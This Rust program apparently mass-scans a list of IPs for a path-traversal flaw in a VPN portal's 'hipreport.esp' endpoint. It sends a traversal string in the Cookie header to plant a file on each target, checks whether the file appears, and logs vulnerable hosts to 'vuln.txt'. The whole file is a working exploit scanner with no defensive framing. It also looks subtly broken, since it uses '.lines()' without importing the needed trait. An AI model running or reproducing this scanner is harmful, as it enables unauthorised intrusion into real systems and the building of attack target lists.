extern crate reqwest;
extern crate url;

use reqwest::blocking::{Client, Response};
use reqwest::header::{CONTENT_LENGTH, CONTENT_TYPE, COOKIE};
use std::error::Error;
use std::fs::OpenOptions;
use std::io::Write;

fn connect(ip: &str) -> Result<(), Box<dyn Error>> {
    let connect_one = format!("https://{}/ssl-vpn/hipreport.esp", ip);
    let connect_two = format!("https://{}/global-protect/portal/images/poc.txt", ip);

    let client = Client::new();

    let mut first_response = client.post(&connect_one)
        .header(COOKIE, "../../../var/appweb/sslvpndocs/global-protect/portal/images/poc.txt")
        .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
        .header(CONTENT_LENGTH, "0")
        .send()?;

    if first_response.status().is_success() {
        let second_response = client.get(&connect_two)
            .send()?;

        match second_response.status().as_u16() {
            403 => {
                println!("IP {} is VULNERABLE!!!", ip);
                let mut file = OpenOptions::new()
                    .append(true)
                    .create(true)
                    .open("vuln.txt")?;
                writeln!(file, "{}", ip)?;
            }
            404 => println!("IP {} is NOT VULNERABLE", ip),
            _ => println!("Unexpected status code {} for IP {}", second_response.status(), ip),
        }
    } else {
        println!("First request failed for IP {}, status code: {}", ip, first_response.status());
    }

    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    let input_file = std::env::args().nth(1).expect("Please provide a list of hosts (IP(s))");

    for line in std::io::BufReader::new(std::fs::File::open(input_file)?).lines() {
        let ip = line?;
        connect(&ip)?;
    }

    Ok(())
}
